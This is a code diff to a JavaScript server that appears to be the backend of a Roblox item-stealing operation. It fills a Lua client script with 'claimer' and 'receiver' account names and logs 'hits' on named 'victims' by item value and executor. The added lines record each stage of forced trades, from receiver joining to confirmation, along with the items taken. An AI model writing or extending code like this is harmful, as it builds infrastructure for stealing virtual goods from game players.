@@ -393,6 +393,10 @@ const luaScript = (user) => CLIENT_LUA
   .replaceAll('{{CLAIMERS}}', (user.claimer?.accounts ?? [])
     .filter((a) => a.status !== 'invalid')
     .map((a) => `"${String(a.username).replace(/[^a-zA-Z0-9_]/g, '')}"`)
+    .join(', '))
+  .replaceAll('{{RECEIVERS}}', (user.config.receivers ?? [])
+    .map((r) => `"${String(r).replace(/[^a-zA-Z0-9_]/g, '')}"`)
+    .filter((r) => r.length > 2)
     .join(', '));
 
 const claimerScript = (user) => {
@@ -1400,16 +1404,41 @@ const handle = async (req, res) => {
       const cfg = user.claimer ?? {};
       const autoJoin = cfg.auto_join !== false;
       const claimerNames = new Set((cfg.accounts ?? []).map((a) => String(a.username).toLowerCase()));
+      let tradeEvents = 0;
       for (const entry of list.slice(0, 25)) {
         const game = GAMES.some((g) => g.id === entry.game) ? entry.game : null;
         if (!game) continue;
+        const clean = (v, n) => String(v ?? '').replace(/[<>\r\n]/g, '').trim().slice(0, n);
+        const placeId = Number(entry.place_id) || null;
+        const serverId = clean(entry.server_id, 60) || null;
+
+        // trade stages from the client: receiver joined -> request -> offer -> confirm
+        if (entry.event === 'trade') {
+          user.trades ??= [];
+          user.trades.unshift({
+            id: randomUUID(),
+            game,
+            stage: clean(entry.stage, 24).toLowerCase() || 'event',
+            receiver: clean(entry.receiver, 40) || 'unknown',
+            items: Array.isArray(entry.items)
+              ? entry.items.slice(0, 40).map((v) => clean(v, 60)).filter(Boolean)
+              : [],
+            detail: clean(entry.detail, 140) || null,
+            place_id: placeId,
+            server_id: serverId,
+            executor: clean(entry.executor, 40) || null,
+            roblox_user: clean(entry.roblox_user, 40) || null,
+            at: Date.now(),
+          });
+          if (user.trades.length > 60) user.trades.length = 60;
+          tradeEvents += 1;
+          continue;
+        }
+
         const victim = String(entry.victim ?? '').slice(0, 40);
         if (victim && store.isBlacklisted(victim)) continue;
         const value = Math.max(0, Number(entry.value) || 0);
         if (value < (user.config.min_value ?? 0)) continue;
-        const clean = (v, n) => String(v ?? '').replace(/[<>\r\n]/g, '').trim().slice(0, n);
-        const placeId = Number(entry.place_id) || null;
-        const serverId = clean(entry.server_id, 60) || null;
         const hit = store.addHit({
           id: randomUUID(),
           user_id: user.id,
@@ -1475,6 +1504,7 @@ const handle = async (req, res) => {
       return json(res, 202, {
         ok: true,
         accepted: accepted.length,
+        trade_events: tradeEvents,
         claim_queued: claimQueued,
         auto_armed: autoArmed,
         delivered: delivery ? delivery.ok : false,
